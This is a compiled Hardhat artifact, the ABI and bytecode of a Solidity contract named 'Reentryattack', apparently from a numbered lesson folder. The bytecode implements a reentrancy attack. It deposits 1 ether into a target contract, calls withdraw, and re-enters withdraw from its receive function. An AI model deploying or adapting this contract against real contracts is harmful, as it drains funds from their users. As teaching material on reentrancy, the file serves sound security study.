{
  "_format": "hh-sol-artifact-1",
  "contractName": "Reentryattack",
  "sourceName": "contracts/12/reentryattack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "addr",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "addr_",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "time",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104be3803806104be833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103a7806101176000396000f3fe6080604052600436106100385760003560e01c806316ada547146100e957806345d69c29146101145780639e5faafc1461013f576100e4565b366100e457600180600082825461004f91906102b7565b92505081905550600260015410156100e25760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100c957600080fd5b505af11580156100dd573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100f557600080fd5b506100fe610149565b60405161010b91906102fa565b60405180910390f35b34801561012057600080fd5b5061012961014f565b6040516101369190610356565b60405180910390f35b610147610173565b005b60015481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101e357600080fd5b505af11580156101f7573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561026457600080fd5b505af1158015610278573d6000803e3d6000fd5b50505050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006102c28261027e565b91506102cd8361027e565b92508282019050808211156102e5576102e4610288565b5b92915050565b6102f48161027e565b82525050565b600060208201905061030f60008301846102eb565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061034082610315565b9050919050565b61035081610335565b82525050565b600060208201905061036b6000830184610347565b9291505056fea2646970667358221220d784b1e6d08dccb1becf3dca5e1ba4b63ac34012ab2af77686af72b59b6ff89464736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}